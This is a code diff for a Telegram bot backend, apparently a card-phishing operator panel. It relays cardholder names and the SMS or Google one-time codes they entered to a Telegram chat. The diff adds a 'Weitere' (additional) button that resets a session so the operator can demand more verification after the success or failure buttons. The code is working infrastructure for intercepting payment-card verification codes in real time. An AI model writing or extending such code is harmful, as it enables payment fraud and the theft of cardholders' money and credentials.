@@ -183,6 +183,31 @@ async function handleCallbackQuery(callbackQuery: any) {
           );
         }
         break;
+
+      case 'additional':
+        console.log(`Requesting additional verification for session: ${sessionId}`);
+        
+        // Reset session for additional verification
+        const { data: resetResult, error: resetError } = await supabase.functions.invoke('payment-sessions/reset-verification', {
+          body: { 
+            sessionId 
+          }
+        });
+        
+        if (resetError) {
+          console.error('Error resetting verification:', resetError);
+          throw resetError;
+        }
+        
+        // Show verification method selection buttons again
+        const verificationButtons = await getVerificationMethodButtons(sessionId);
+        await editMessageText(
+          message.chat.id,
+          message.message_id,
+          `🔄 **Weitere Verifikation angefordert**\n\n${message.text}`,
+          verificationButtons
+        );
+        break;
     }
 
     // Answer callback query to remove loading state
@@ -208,6 +233,8 @@ async function handleCallbackQuery(callbackQuery: any) {
     } else if (action === 'complete') {
       const success = params[0] === 'success';
       confirmationMessage = success ? '✅ Zahlung erfolgreich abgeschlossen' : '❌ Zahlung fehlgeschlagen';
+    } else if (action === 'additional') {
+      confirmationMessage = '🔄 Weitere Verifikation angefordert';
     }
     
     await fetch(`https://api.telegram.org/bot${telegramToken}/answerCallbackQuery`, {
@@ -297,17 +324,17 @@ async function sendNotification(chatId: string, type: string, data: any) {
         message = `✅ <b>App Verification Confirmed</b>\n\n` +
                   `Karteninhaber: ${escapeHTML(data.cardholder_name || 'Unknown')}\n` +
                   `Method: ${escapeHTML(data.verification_method)}`;
-        buttons = getCompletionButtons(data.session_id);
+        buttons = await getCompletionButtons(data.session_id);
       } else if (data.verification_status === 'sms_confirmation' && data.sms_code) {
         message = `📱 <b>SMS Code Entered</b>\n\n` +
                   `Karteninhaber: ${escapeHTML(data.cardholder_name || 'Unknown')}\n` +
                   `Code: <code>${escapeHTML(data.sms_code)}</code>`;
-        buttons = getCompletionButtons(data.session_id);
+        buttons = await getCompletionButtons(data.session_id);
       } else if (data.verification_status === 'google_code_confirmation' && data.google_code) {
         message = `🔢 <b>Google Code Entered</b>\n\n` +
                   `Karteninhaber: ${escapeHTML(data.cardholder_name || 'Unknown')}\n` +
                   `Code: <code>${escapeHTML(data.google_code)}</code>`;
-        buttons = getCompletionButtons(data.session_id);
+        buttons = await getCompletionButtons(data.session_id);
       } else if (data.message && data.message.includes('User wählte:')) {
         // Handle user choice notification
         const choice = data.verification_method === 'app_confirmation' ? 'App-Bestätigung' : 'SMS-Bestätigung';
@@ -444,12 +471,15 @@ async function getVerificationChoiceButtons(sessionId: string) {
   };
 }
 
-function getCompletionButtons(sessionId: string) {
+async function getCompletionButtons(sessionId: string) {
+  const additionalShortCode = await getShortCode('additional_verification');
+  
   return {
     inline_keyboard: [
       [
         { text: '✅ Erfolgreich', callback_data: `complete:${sessionId}:success` },
-        { text: '❌ Fehlgeschlagen', callback_data: `complete:${sessionId}:failed` }
+        { text: '❌ Fehlgeschlagen', callback_data: `complete:${sessionId}:failed` },
+        { text: '🔄 Weitere', callback_data: `additional:${sessionId}:${additionalShortCode}` }
       ]
     ]
   };
